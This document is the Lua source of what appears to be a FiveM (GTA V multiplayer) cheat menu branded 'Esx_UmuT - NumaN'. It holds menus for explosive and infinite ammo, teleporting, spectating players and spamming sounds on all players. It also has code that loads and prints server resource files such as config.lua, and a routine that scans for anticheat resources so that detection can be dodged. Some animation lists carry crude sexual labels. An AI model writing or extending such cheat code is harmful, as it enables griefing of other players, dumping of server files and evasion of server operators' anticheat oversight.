            ['Text'] = 'Vehicle performance →',
            ['Type'] = 'menu',
            ['Menu'] = 16
        },
        {
            ['Text'] = 'Set vehicle plate text',
            ['Type'] = 'button',
            ['cb'] = CarMenu,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 12
        }
    },
    {
        {
            ['Text'] = 'Neon lights',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Neon RGB',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Paintjob RGB',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 14
        }
    },
    {
        {
            ['Text'] = 'Boost vehicle',
            ['Type'] = 'list',
            ['Items'] = {
                '0.0', '20.0', '40.0', '60.0', '80.0', '100.0', '120.0', '140.0', '160.0', '180.0', '200.0'
            },
            ['Current'] = 1,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Vehicle nitro [L CTRL]',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Super handling',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 14
        }
    },
    {
        {
            ['Text'] = 'Enter car when spawning',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Spawn car [custom input]',
            ['Type'] = 'button',
            ['cb'] = CarMenu
        },
        {
            ['Text'] = 'Spawn custom car',
            ['Type'] = 'list',
            ['Items'] = {'Robot'},
            ['Current'] = 1,
            ['cb'] = CreateCustomCar
        },
    },
    {
        {
            ['Text'] = 'Lock time',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Set hour of day',
            ['Type'] = 'list',
            ['Items'] = {
                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23'
            },
            ['Current'] = 9,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Set weather',
            ['Type'] = 'list',
            ['Items'] = {
                'NONE', 'EXTRASUNNY', 'CLEAR', 'NEUTRAL', 'SMOG', 'FOGGY', 'OVERCAST', 'CLOUDS', 'CLEARING', 'RAIN', 'THUNDER', 'SNOW', 'BLIZZARD', 'SNOWLIGHT', 'XMAS', 'HALLOWEEN'
            },
            ['Current'] = 1,
            ['cb'] = WeatherMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {
        {
            ['Text'] = 'Special finish',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Suppressor',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Scope',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Flashlight',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Grip',
            ['Type'] = 'list',
            ['Items'] = {
                'add', 'remove'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Tint',
            ['Type'] = 'list',
            ['Items'] = {
                'normal', 'green', 'gold', 'pink', 'army', 'lspd', 'orange', 'platinum'
            },
            ['Current'] = 1,
            ['cb'] = WeaponCustomization
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 7
        },
    },
    {},
    {
        {
            ['Text'] = 'Teleport to waypoint',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Teleport to coords',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '✈️ Airplane',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '🚘 Vehicle Shop',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '🏪 Shop',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '🏥 Hospital',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '🏢 Motel',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '🚔 LSPD',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'LS Customs',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Main Garage',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Clothes Shop',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Barber',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
    },
    {
        {
            ['Text'] = 'Festive',
            ['Type'] = 'list',
            ['Items'] = {'Smoke','Musician','Dj','Coffee','Beer','Air Guitar','Air Shagging','Rock\'n\'roll','Drunk Standing','Vomiting',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Greetings',
            ['Type'] = 'list',
            ['Items'] = {'Hello','Birk','Handshake','Hugging','Salute',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Job',
            ['Type'] = 'list',
            ['Items'] = {'Suspect : Surrender','Fishing','Police : Investigate','Police : Use Radio','Police : Traffic','Police : Binoculars','Agriculture : Planting','Mechanic : Fixing Motor','Medic : Kneel','Taxi : Talk to customer','Taxi : Give bill','Grocer : Give','Barman : Serve Shot','Journalist : Take Photos','All Jobs : Clipboard','All Jobs : Hammering','Bum : Holding Sign','Bum : Human Statue',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Fun',
            ['Type'] = 'list',
            ['Items'] = {'Cheering','Super','Point','Come here','Bring it on','Me','I knew it','Exhausted','I\'m the shit','Facepalm','Calm down ','What did I do?','Fear','Fight ?','It\'s not possible !','Embrace','Finger of honor','You wanker','Bullet in the head',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Sports',
            ['Type'] = 'list',
            ['Items'] = {'Flex muscles','Lift weights','Do push ups','Do sit ups','Do yoga',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Divers',
            ['Type'] = 'list',
            ['Items'] = {'Drink coffee','Sit','Lean against wall','Sunbathe Back','Sunbathe Front','Clean','BBQ','Search','Take selfie','Listen to wall/door',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Walking Styles',
            ['Type'] = 'list',
            ['Items'] = {'Normal M','Normal F','Depressed male','Depressed female','Business','Determined','Casual','Ate too much','Hipster','Injured','In a hurry','Hobo','sad','Muscle','Shocked','Being shady','Buzzed','Hurry','Proud','Short race','Man eater','Sassy','Arrogant',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'NSFW',
            ['Type'] = 'list',
            ['Items'] = {'Man receiving in car','Woman giving in car','Man on bottom in car','Woman on top in car','Scratch nuts','Hooker 1','Hooker 2','Hooker 3','Strip Tease 1','Strip Tease 2','Stip Tease On Knees',},
            ['Current'] = 1,
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Cancel animation',
            ['Type'] = 'button',
            ['cb'] = AnimationsMenu
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
    },
    {
        {
            ['Text'] = 'Interactsound spammer',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Interactsound blocker',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Play on all',
            ['Type'] = 'list',
            ['Items'] = interactsoundaudios,
            ['Current'] = 1,
            ['cb'] = PlayInteractSound,
        },
        {
            ['Text'] = 'Cancel sound (self)',
            ['Type'] = 'button',
            ['cb'] = PlayInteractSound
        },
        {
            ['Text'] = 'Cancel sound (all)',
            ['Type'] = 'button',
            ['cb'] = PlayInteractSound
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 6
        },
    },
    {
        {
            ['Text'] = 'Reset Player',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '😷 Corona',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },        
        {
            ['Text'] = '🤖 Robot',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },     
        {
            ['Text'] = '🤢 Zombie',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },   
        {
            ['Text'] = '👽 Esx UmuT',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },   
        {
            ['Text'] = '👨‍⚕️ Doctor',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },  
        {
            ['Text'] = '💋 Sexy Woman',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },  
        {
            ['Text'] = 'NumaN',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },  
        {
            ['Text'] = 'Burglar',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Police Woman',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Naked',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'SWAT',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Michael',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Franklin',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Trevor',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Polat Alemdar',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },    
        {
            ['Text'] = 'Jesus',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },    
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    },
    {
        {
            ['Text'] = 'Infinite ammo',
            ['Type'] = 'list',
            ['Items'] = {'off', 'safe', 'infinite ammo'},
            ['Current'] = 1,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Teleport to bullet',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Firework ammo',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Explosive ammo',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 7
        },
    },
    {
        {
            ['Text'] = 'Freecam',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = FreeCam 
        },
        {
            ['Text'] = 'Object preview',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress 
        },
        {
            ['Text'] = 'Freecam speed',
            ['Type'] = 'list',
            ['Items'] = {'0.5', '1.0', '1.5', '2.0', '3.5', '4.0', '4.5', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '12.5', '15.0', '17.5', '20.0', '25.0', '30.0', '35.0', '40.0', '50.0', '60.0', '70.0', '80.0', '90.0', '100.0'},
            ['Current'] = 2,
            ['cb'] = FreeCam
        },
        {
            ['Text'] = 'Freecam object',
            ['Type'] = 'list',
            ['Items'] = objectnamelist,
            ['Current'] = 1,
            ['cb'] = FreeCam
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
    }
}

CreateThread(function()
    local Objects, Peds, Vehicles = {}, {}, {}
    CreateThread(function()
        while true do
            if Toggles['Prop outline'] or Toggles['Ped outline'] or Toggles['Vehicle outline'] then
                Objects = GetStuff('Object')
                Peds = GetStuff('Ped')
                Vehicles = GetStuff('Vehicle')
            end
            Wait(1500)
        end
    end)
    local colour = {255, 255, 255, 255}
    while true do
        Wait(0)
        if Toggles['Prop outline'] then
            for k, v in pairs(Objects) do
                DrawEntityBox(v, colour)
            end
        end
        if Toggles['Ped outline'] then
            for k, v in pairs(Peds) do
                DrawEntityBox(v, colour)
            end
        end
        if Toggles['Vehicle outline'] then
            for k, v in pairs(Vehicles) do
                DrawEntityBox(v, colour)
            end
        end
    end
end)

local Menu00wqdqdqwd = function()
    
    local selected, selectedfake = 1, 1
    local delay = GetGameTimer()
    local currentmenu = 1
    

    while not MenuDisabled do
        Wait(0)

        if IsDisabledControlJustReleased(0, 316) and not visible then
            menuvisiblewdqdq = true
            if Toggles['Menu sounds'] then
                PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end

        if menuvisiblewdqdq then

            if IsDisabledControlJustReleased(0, 194) then
                selected = 1
                if Menus[currentmenu][3] then
                    currentmenu = Menus[currentmenu][3]
                else
                    menuvisiblewdqdq = false
                end
                if Toggles['Menu sounds'] then
                    PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end
            end

            DrawSprite('wave1', 'logo1', MenuXOffset , MenuYOffset - 0.285, 0.189, 0.07, 0, 10, 255, 255, 255, alpha)
            -----HACI BU YUKARIDA TİTLE VAR YA ONUN AYARI BU
            DrawTxt('~u~⚡️Esx_UmuT - NumaN⚡️ ', MenuYOffset - 0.248, true, nil, 0.25, MenuXOffset, true, 0.1)
            DrawTxt('~u~discord.gg/esxpublic', MenuYOffset + 0.229, true, nil, 0.23, MenuXOffset - 0.01, true, 0.1)
            DrawRect(MenuXOffset, MenuYOffset, 0.197, 0.5, table.unpack(MenuColor['Background']))
            DrawRect(MenuXOffset, MenuYOffset, 0.19, 0.50, table.unpack(RGB(0.1, true)))
            DrawRect(MenuXOffset, MenuYOffset, 0.17, 0.455, table.unpack(MenuColor['Main']))

            local TopOffset = 0.095

            local Stuff = {}
            local Current = 1
            for k, v in pairs(Objects[currentmenu]) do

                if k == selected then
                    selectedfake = Current
                end

                if #Objects[currentmenu] <= 12 then
                    table.insert(Stuff, v)
                    Current = Current + 1
                else
                    if selected <= 12 then
                        if k <= 12 then
                            table.insert(Stuff, v)
                            Current = Current + 1
                        end
                    else
                        if k > (#Objects[currentmenu] - (#Objects[currentmenu] - selected)) - 12 then
                            if k < (#Objects[currentmenu] - (#Objects[currentmenu] - selected)) + 1 then
                                table.insert(Stuff, v)
                                Current = Current + 1
                            end
                        end
                    end
                end
            end

            local List = {}
            for k, v in pairs(Stuff) do
                table.insert(List, v)
            end

            for k, v in pairs(List) do
                local YOffset = MenuYOffset - 0.32
                
                if v['Type'] == 'button' or v['Type'] == 'menu' then
                    if k == selectedfake then
                        DrawTxt(v['Text'], YOffset + TopOffset, false, {0, 0, 0})
                    else
                        DrawTxt(v['Text'], YOffset + TopOffset, false)
                    end
                elseif v['Type'] == 'list' then
                    local text = ('%s ← ~b~%s ~s~→'):format(v['Text'], v['Items'][v['Current']]:lower())
                    if k == selectedfake then
                        DrawTxt(text, YOffset + TopOffset, false, {0, 0, 0})
                    else
                        DrawTxt(text, YOffset + TopOffset, false)
                    end
                elseif v['Type'] == 'toggle' then
                    if k ~= selectedfake then
                        if v['Enabled'] then
                            DrawTxt(v['Text'], YOffset + TopOffset, false, {0, 255, 119})
                        else
                            DrawTxt(v['Text'], YOffset + TopOffset, false, {255, 0, 43})
                        end
                    else
                        if v['Enabled'] then
                            DrawTxt(v['Text'] .. ' ~g~[ON]', YOffset + TopOffset, false, {0, 0, 0})
                        else
                            DrawTxt(v['Text'] .. ' ~r~[OFF]', YOffset + TopOffset, false, {0, 0, 0})
                        end
                    end
                end
                TopOffset = TopOffset + 0.039
            end
            
            if delay < GetGameTimer() then
                if IsDisabledControlPressed(0, 173) then
                    if Objects[currentmenu][selected + 1] then
                        selected = selected + 1
                    else
                        selected = 1
                    end
                    delay = GetGameTimer() + menudelay
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 172) then
                    if Objects[currentmenu][selected - 1] then
                        selected = selected - 1
                    else
                        selected = #Objects[currentmenu]
                    end
                    delay = GetGameTimer() + menudelay
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 191) then
                    if Toggles['Menu sounds'] then
                        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'toggle' then
                        v['Enabled'] = not v['Enabled']
                        v['cb'](v)
                    elseif v['Type'] == 'button' then
                        v['cb'](v)
                    elseif v['Type'] == 'list' then
                        v['cb'](v)
                    elseif v['Type'] == 'menu' then
                        selected = 1
                        if string.find(v['Text'], "Server resources") then
                            Objects[v['Menu']] = {}
                            for i = 0, GetNumResources() - 1 do
                                if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                                    table.insert(Objects[v['Menu']], {
                                        ['Text'] = GetResourceByFindIndex(i) .. ' →',
                                        ['Type'] = 'menu',
                                        ['Menu'] = 20,
                                        ['Other'] = GetResourceByFindIndex(i)
                                    })
                                end
                            end
                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 3
                            })
                        end 
                        if v['Menu'] == 20 then
                            Objects[v['Menu']] = {}
                            local text = LoadResourceFile(v['Other'], 'config.lua')
                            local PrintConfig = function()
                                oldPrint(text)
                            end

                            local PrintCustom = function()
                                local file = KeyboardInput('What file to print? Don\'t forget extension (e.g. .lua)', '', 30)
                                if file then
                                    local filedata = LoadResourceFile(v['Other'], file)
                                    if filedata then
                                        oldPrint(filedata)
                                    else
                                        oldPrint('File not found')
                                    end
                                end
                            end

                            if text then
                                table.insert(Objects[v['Menu']], {
                                    ['Text'] = 'Print config.lua file [F8]',
                                    ['Type'] = 'button',
                                    ['cb'] = PrintConfig
                                })
                            end

                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Print custom file [F8]',
                                ['Type'] = 'button',
                                ['cb'] = PrintCustom
                            })

                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 4
                            })
                        end
                        if string.find(v['Text'], "Online Options") then
                            Objects[v['Menu']] = {}
                            local menuId = v['Menu']
                            for k, v in pairs(GetActivePlayers()) do
                                table.insert(Objects[menuId], {
                                    ['Text'] = GetPlayerName(v) .. ' (' .. GetPlayerServerId(v) .. ')',
                                    ['Type'] = 'menu',
                                    ['Menu'] = 10
                                })
                            end
                            table.insert(Objects[v['Menu']], {
                                ['Text'] = 'Back',
                                ['Type'] = 'menu',
                                ['Menu'] = 1
                            })
                        end 
                        -- if string.find(v['Text'], 'Interactsound menu') then
                        --     Objects[v['Menu']] = {
                        --         {
                        --             ['Text'] = 'Interactsound spammer',
                        --             ['Type'] = 'toggle',
                        --             ['Enabled'] = false,
                        --             ['cb'] = MenuPress
                        --         },
                        --         {
                        --             ['Text'] = 'Play on all',
                        --             ['Type'] = 'list',
                        --             ['Items'] = interactsoundaudios,
                        --             ['Current'] = 1,
                        --             ['cb'] = PlayInteractSound,
                        --         },
                        --         {
                        --             ['Text'] = 'Cancel sound (self)',
                        --             ['Type'] = 'button',
                        --             ['cb'] = PlayInteractSound
                        --         },
                        --         {
                        --             ['Text'] = 'Cancel sound (all)',
                        --             ['Type'] = 'button',
                        --             ['cb'] = PlayInteractSound
                        --         },
                        --         {
                        --             ['Text'] = 'Back',
                        --             ['Type'] = 'menu',
                        --             ['Menu'] = 6
                        --         }
                        --     }
                        -- end
                        for x, y in pairs(GetActivePlayers()) do
                            if string.find(v['Text'], '(' .. GetPlayerServerId(y) .. ')', 1, true) then
                                Menus[10][1] = GetPlayerName(y) .. ' (' .. GetPlayerServerId(y) .. ')'
                                for k, v in pairs(Objects[10]) do
                                    if string.find((v['Text']):lower(), 'friend', 1, true) then
                                        if friends[GetPlayerServerId(y)] then
                                            v['Text'] = 'Remove friend'
                                        else
                                            v['Text'] = 'Set as friend'
                                        end
                                    end
                                    if string.find((v['Text']):lower(), 'spectat') then
                                        if spectating then
                                            if currentlyspectating == GetPlayerServerId(y) then
                                                v['Text'] = 'Stop spectating'
                                            else
                                                v['Text'] = 'Spectate'
                                            end
                                        else
                                            v['Text'] = 'Spectate'
                                        end
                                    end
                                end
                                currentplayer = GetPlayerServerId(y)
                            end
                        end
                        currentmenu = v['Menu']
                    end

                    delay = GetGameTimer() + menudelay
                elseif IsDisabledControlPressed(0, 174) then
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'list' then
                        if v['Items'][v['Current'] - 1] then
                            v['Current'] = v['Current'] - 1
                        else
                            v['Current'] = #v['Items']
                        end
                        if Toggles['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        delay = GetGameTimer() + menudelay
                    end
                elseif IsDisabledControlPressed(0, 175) then
                    local v = Objects[currentmenu][selected]
                    if v['Type'] == 'list' then
                        if v['Items'][v['Current'] + 1] then
                            v['Current'] = v['Current'] + 1
                        else
                            v['Current'] = 1
                        end
                        if Toggles['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        delay = GetGameTimer() + menudelay
                    end
                end
            end
            
        end
    end
end

local SearchAnticheat00dffwfewef = function()
    for k, v in pairs(Anticheats) do
        for i = 0, GetNumResources() - 1 do
            if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
                local text = LoadResourceFile(GetResourceByFindIndex(i), v[1])
                if text then
                    if text.find((text):lower(), v[2]:lower()) then
                        print('Anticheat warning! ^1' .. GetResourceByFindIndex(i))
                        anticheatrunning = true
                        local timer = GetGameTimer() + 4500
                        while timer >= GetGameTimer() do
                            Wait(0)
                            DrawTxt(('This server using an anticheat (resource: %s).\nSome functions have been disabled for your safety.'):format(GetResourceByFindIndex(i)), 0.3, false, {255, 0, 0}, 0.5, 0.5, true, 0.1)
                        end
                        return
                    end
                end
            end
        end
    end
end

local PlayerUpdate00qwdqwdqd = function()
    while true do
        allplayers = {}
        for k, v in pairs(GetActivePlayers()) do
            if not friends[GetPlayerServerId(v)] then
                table.insert(allplayers, v)
            end
        end
        Wait(1000)
    end
end

vehicles = {
    ['cycles'] = {
        'BMX',
        'CRUISER',
        'FIXTER',
        'SCORCHER',
        'TRIBIKE',
        'TRIBIKE2',
        'TRIBIKE3',
    },
    ['sports'] = {
        'ALPHA',
        'BANSHEE',
        'BESTIAGTS',
        'BLISTA2',
        'BLISTA3',
        'BUFFALO',
        'BUFFALO2',
        'BUFFALO3',
        'CARBONIZZARE',
        'COMET2',
        'COMET3',
        'COMET4',
        'COMET5',
        'COQUETTE',
        'ELEGY',
        'ELEGY2',
        'FELTZER2',
        'FLASHGT',
        'FUROREGT',
        'FUSILADE',
        'FUTO',
        'GB200',
        'HOTRING',
        'ITALIGTO',
        'JESTER',
        'JESTER2',
        'KHAMELION',
        'KURUMA',
        'KURUMA2',
        'LYNX',
        'MASSACRO',
        'MASSACRO2',
        'NEON',
        'NINEF',
        'NINEF2',
        'OMNIS',
        'PARIAH',
        'PENUMBRA',
        'RAIDEN',
        'RAPIDGT',
        'RAPIDGT2',
        'RAPTOR',
        'REVOLTER',
        'RUSTON',
        'SCHAFTER2',
        'SCHAFTER3',
        'SCHAFTER4',
        'SCHAFTER5',
        'SCHLAGEN',
        'SCHWARZER',
        'SENTINEL3',
        'SEVEN70',
        'SPECTER',
        'SPECTER2',
        'SULTAN',
        'SURANO',
        'TAMPA2',
        'TROPOS',
        'VERLIERER2',
        'ZR380',
        'ZR3802',
        'ZR3803',
    },
    ['compacts'] = {
        'BLISTA',
        'BRIOSO',
        'DILETTANTE',
        'ISSI2',
        'ISSI3',
        'ISSI4',
        'ISSI5',
        'ISSI6',
        'PANTO',
        'PRAIRIE',
        'RHAPSODY',
    },
    ['offroad'] = {
        'BFINJECTION',
        'BIFTA',
        'BLAZER',
        'BLAZER2',
        'BLAZER3',
        'BLAZER4',
        'BLAZER5',
        'BODHI2',
        'BRAWLER',
        'BRUISER',
        'BRUISER2',
        'BRUISER3',
        'BRUTUS',
        'BRUTUS2',
        'BRUTUS3',
        'CARACARA',
        'DLOADER',
        'DUBSTA3',
        'DUNE',
        'DUNE2',
        'DUNE3',
        'DUNE4',
        'DUNE5',
        'FREECRAWLER',
        'INSURGENT',
        'INSURGENT2',
        'INSURGENT3',
        'KALAHARI',
        'KAMACHO',
        'MARSHALL',
        'MENACER',
        'MESA3',
        'MONSTER',
        'MONSTER3',
        'MONSTER4',
        'MONSTER5',
        'NIGHTSHARK',
        'RANCHERXL',
        'RANCHERXL2',
        'RCBANDITO',
        'REBEL',
        'REBEL2',
        'RIATA',
        'SANDKING',
        'SANDKING2',
        'TECHNICAL',
        'TECHNICAL2',
        'TECHNICAL3',
        'TROPHYTRUCK',
        'TROPHYTRUCK2',
    },
    ['sportsclassics'] = {
        'ARDENT',
        'BTYPE',
        'BTYPE2',
        'BTYPE3',
        'CASCO',
        'CHEBUREK',
        'CHEETAH2',
        'COQUETTE2',
        'DELUXO',
        'FAGALOA',
        'FELTZER3',
        'GT500',
        'INFERNUS2',
        'JB700',
        'JESTER3',
        'MAMBA',
        'MANANA',
        'MICHELLI',
        'MONROE',
        'PEYOTE',
        'PIGALLE',
        'RAPIDGT3',
        'RETINUE',
        'SAVESTRA',
        'STINGER',
        'STINGERGT',
        'STROMBERG',
        'SWINGER',
        'TORERO',
        'TORNADO',
        'TORNADO2',
        'TORNADO3',
        'TORNADO4',
        'TORNADO5',
        'TORNADO6',
        'TURISMO2',
        'VISERIS',
        'Z190',
        'ZTYPE',
    },
    ['motorcycles'] = {
        'AKUMA',
        'AVARUS',
        'BAGGER',
        'BATI',
        'BATI2',
        'BF400',
        'CARBONRS',
        'CHIMERA',
        'CLIFFHANGER',
        'DAEMON',
        'DAEMON2',
        'DEFILER',
        'DEATHBIKE',
        'DEATHBIKE2',
        'DEATHBIKE3',
        'DIABLOUS',
        'DIABLOUS2',
        'DOUBLE',
        'ENDURO',
        'ESSKEY',
        'FAGGIO',
        'FAGGIO2',
        'FAGGIO3',
        'FCR',
        'FCR2',
        'GARGOYLE',
        'HAKUCHOU',
        'HAKUCHOU2',
        'HEXER',
        'INNOVATION',
        'LECTRO',
        'MANCHEZ',
        'NEMESIS',
        'NIGHTBLADE',
        'OPPRESSOR',
        'OPPRESSOR2',
        'PCJ',
        'RATBIKE',
        'RUFFIAN',
        'SANCHEZ',
        'SANCHEZ2',
        'SANCTUS',
        'SHOTARO',
        'SOVEREIGN',
        'THRUST',
        'VADER',
        'VINDICATOR',
        'VORTEX',
        'WOLFSBANE',
        'ZOMBIEA',
        'ZOMBIEB',
    },
    ['utility'] = {
        'AIRTUG',
        'CADDY',
        'CADDY2',
        'CADDY3',
        'DOCKTUG',
        'FORKLIFT',
        'TRACTOR2',
        'TRACTOR3',
        'MOWER',
        'RIPLEY',
        'SADLER',
        'SADLER2',
        'SCRAP',
        'TOWTRUCK',
        'TOWTRUCK2',
        'TRACTOR',
        'UTILLITRUCK',
        'UTILLITRUCK2',
        'UTILLITRUCK3',
        'ARMYTRAILER',
        'ARMYTRAILER2',
        'FREIGHTTRAILER',
        'ARMYTANKER',
        'TRAILERLARGE',
        'DOCKTRAILER',
        'TR3',
        'TR2',
        'TR4',
        'TRFLAT',
        'TRAILERS',
        'TRAILERS4',
        'TRAILERS2',
        'TRAILERS3',
        'TVTRAILER',
        'TRAILERLOGS',
        'TANKER',
        'TANKER2',
        'BALETRAILER',
        'GRAINTRAILER',
        'BOATTRAILER',
        'RAKETRAILER',
        'TRAILERSMALL',
    },
    ['commercial'] = {
        'BENSON',
        'BIFF',
        'CERBERUS',
        'CERBERUS2',
        'CERBERUS3',
        'HAULER',
        'HAULER2',
        'MULE',
        'MULE2',
        'MULE3',
        'MULE4',
        'PACKER',
        'PHANTOM',
        'PHANTOM2',
        'PHANTOM3',
        'POUNDER',
        'POUNDER2',
        'STOCKADE',
        'STOCKADE3',
        'TERBYTE',
        'CABLECAR',
        'FREIGHT',
        'FREIGHTCAR',
        'FREIGHTCONT1',
        'FREIGHTCONT2',
        'FREIGHTGRAIN',
        'METROTRAIN',
        'TANKERCAR',
    },
    ['super'] = {
        'ADDER',
        'AUTARCH',
        'BANSHEE2',
        'BULLET',
        'CHEETAH',
        'CYCLONE',
        'DEVESTE',
        'ENTITYXF',
        'ENTITY2',
        'FMJ',
        'GP1',
        'INFERNUS',
        'ITALIGTB',
        'ITALIGTB2',
        'LE7B',
        'NERO',
        'NERO2',
        'OSIRIS',
        'PENETRATOR',
        'PFISTER811',
